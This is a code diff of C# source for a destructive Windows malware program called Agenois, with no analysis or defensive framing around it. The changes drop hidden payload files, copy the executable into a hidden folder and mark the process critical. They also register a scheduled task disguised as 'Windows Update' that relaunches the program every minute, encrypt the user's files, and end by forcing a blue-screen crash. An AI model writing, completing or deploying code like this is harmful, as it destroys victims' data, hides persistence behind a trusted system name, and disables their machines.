@@ -31,15 +31,16 @@ namespace Agenois
 
             if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Agenois", "AgenoisInfected", null) == null)
             {
+                MessageBox.Show("ayye lol");
                 File.WriteAllBytes(extractPath + "\\Payloads.dll", Resources.Payloads);
                 File.WriteAllBytes(extractPath + "\\cursor.ani", Resources.skull1);
                 File.WriteAllText(extractPath + "\\Action.bat", Resources.Action);
                 File.WriteAllBytes(extractPath + "\\IFEO.exe", Resources.IFEODebugger);
-                //File.Copy(Application.ExecutablePath, extractPath + @"\Agenois.exe"); Error
+                File.Copy(Application.ExecutablePath, extractPath + @"\Agenois.exe");
 
                 DirectoryInfo ch = new DirectoryInfo(extractPath);
                 ch.Attributes = FileAttributes.Hidden;
-                Thread.Sleep(1000);
+                
                 Destructive.EnableCriticalMode();
 
                 editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
@@ -181,7 +182,7 @@ namespace Agenois
                 LogonTrigger interval = new LogonTrigger();
                 interval.Repetition.Interval = TimeSpan.FromMinutes(1);
                 td.Triggers.Add(interval);
-                td.Actions.Add(new ExecAction(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\Defender" + @"\Agenois.exe", null));
+                td.Actions.Add(new ExecAction(@"C:\Windows\Defender\Agenois.exe", null));
                 ts.RootFolder.RegisterTaskDefinition("Windows Update", td);
 
                 Destructive.EncryptUserFiles();
@@ -190,15 +191,12 @@ namespace Agenois
                 editKey.SetValue("AgenoisInfected", "1");
                 editKey.Close();
 
-                Thread.Sleep(9000);
-
-                MessageBox.Show("Your Pc Is Infected By Agenois", "Agenois", 0, MessageBoxIcon.Warning);
-
-                Others.StartProcess("shutdown.exe", "/r /t 0");
+                Agenois.Payloads.Destructive.BSOD();
             }
             else
             {
                 Destructive.EnableCriticalMode();
+                MessageBox.Show("Ayye lol");
                 //Start main funcs
             }
         }
